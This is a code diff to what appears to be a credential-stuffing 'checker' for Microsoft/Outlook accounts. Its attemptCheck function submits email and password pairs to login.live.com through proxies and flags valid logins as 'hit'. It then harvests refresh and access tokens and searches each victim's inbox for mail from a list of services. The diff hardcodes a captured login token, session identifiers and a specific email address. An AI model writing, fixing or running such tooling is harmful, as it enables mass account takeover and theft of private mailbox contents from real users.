@@ -212,7 +212,7 @@ const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 
-const AUTHORIZE_URL = "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch";
+const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";
 
 const LOGIN_HEADERS = {
   "Host": "login.live.com",
@@ -361,31 +361,12 @@ async function attemptCheck(email, password) {
   const cookieJar = createCookieJar();
 
   try {
-    // ── Step 0: Pre-auth GET to get fresh PPFT + cookies ──
-    const preAuthResp = await sessionFetch(AUTHORIZE_URL, {
-      method: "GET",
-      headers: { ...LOGIN_HEADERS },
-      signal: AbortSignal.timeout(15000),
-    }, cookieJar);
-
-    const preAuthBody = await preAuthResp.text();
-    const ppft = parseLR(preAuthBody, 'name="PPFT" id="i0327" value="', '"')
-              || parseLR(preAuthBody, "sFT:'", "'")
-              || parseLR(preAuthBody, 'value="', '"');
-    const urlPost = parseLR(preAuthBody, "urlPost:'", "'");
-
-    if (!ppft || !urlPost) {
-      result.status = "retry";
-      result.detail = "no PPFT/urlPost from pre-auth";
-      return result;
-    }
-
-    // ── Step 1: Login POST with fresh PPFT ──
+    // ── Step 1: Login ──
     const postData = new URLSearchParams({
       ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
       canary: "", ctx: "", hpgrequestid: "",
-      PPFT: ppft,
-      PPSX: "Pa", NewUser: "1", FoundMSAs: "",
+      PPFT: "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$",
+      PPSX: "PassportRN", NewUser: "1", FoundMSAs: "",
       fspost: "0", i21: "0", CookieDisclosure: "0",
       IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
       i13: "1", login: email, loginfmt: email,
@@ -393,7 +374,7 @@ async function attemptCheck(email, password) {
       hisRegion: "", hisScaleUnit: "", passwd: password,
     });
 
-    const resp = await sessionFetch(urlPost, {
+    const resp = await sessionFetch(LOGIN_URL, {
       method: "POST",
       headers: { ...LOGIN_HEADERS },
       body: postData.toString(),
@@ -437,7 +418,7 @@ async function attemptCheck(email, password) {
     }
 
     const cookieStr = cookieJar.toString();
-    if (cookieStr.includes("ANON") || cookieStr.includes("WLSSC") ||
+    if ((cookieStr.includes("ANON") || cookieStr.includes("WLSSC")) &&
         finalUrl.includes("https://login.live.com/oauth20_desktop.srf?")) {
       result.status = "hit";
     } else {
@@ -448,9 +429,8 @@ async function attemptCheck(email, password) {
 
     // ── Step 2: Get substrate access token ──
     let accessToken = "";
-    let refreshToken = parseLR(finalUrl, "refresh_token=", "&") || parseLR(finalUrl, "refresh_token=", "#");
-    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&") || parseLR(body, "refresh_token=", "#");
-    if (refreshToken) refreshToken = decodeURIComponent(refreshToken);
+    let refreshToken = parseLR(finalUrl, "refresh_token=", "&");
+    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&");
 
     if (refreshToken) {
       try {
@@ -476,13 +456,8 @@ async function attemptCheck(email, password) {
           },
           signal: AbortSignal.timeout(15000),
         });
-        const tokenText = await tokenResp.text();
-        try {
-          const tokenJson = JSON.parse(tokenText);
-          accessToken = tokenJson.access_token || "";
-        } catch {
-          accessToken = parseLR(tokenText, '"access_token":"', '"') || parseLR(tokenText, "access_token=", "&");
-        }
+        const tokenJson = await tokenResp.json();
+        accessToken = tokenJson.access_token || "";
       } catch {}
     }
 
@@ -550,7 +525,7 @@ async function attemptCheck(email, password) {
 
     // ── Step 5: Search inbox for ALL services ──
     const anchor = refreshToken ? `CID:${refreshToken}` : "";
-    if (accessToken && accessToken.includes("Ew")) {
+    if (accessToken && accessToken.startsWith("Ew")) {
       const mailHeaders = {
         "User-Agent": "Outlook-Android/2.0",
         "Pragma": "no-cache",
@@ -563,22 +538,13 @@ async function attemptCheck(email, password) {
         "Accept-Encoding": "gzip",
       };
 
-      // Match SB flow: warm up folders endpoint before search
-      try {
-        await proxiedFetch("https://outlook.office.com/api/beta/me/MailFolders", {
-          method: "GET",
-          headers: mailHeaders,
-          signal: AbortSignal.timeout(10000),
-        });
-      } catch {}
-
       // Search each service
       for (const svc of SERVICES) {
         try {
           const searchBody = {
             Cvid: "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
             Scenario: { Name: "owa.react" },
-            TimeZone: "Egypt Standard Time",
+            TimeZone: "UTC",
             TextDecorations: "Off",
             EntityRequests: [{
               EntityType: "Conversation",
@@ -619,7 +585,7 @@ async function attemptCheck(email, password) {
           };
 
           const searchResp = await proxiedFetch(
-            "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
+            "https://outlook.live.com/search/api/v2/query?n=124",
             {
               method: "POST",
               body: JSON.stringify(searchBody),
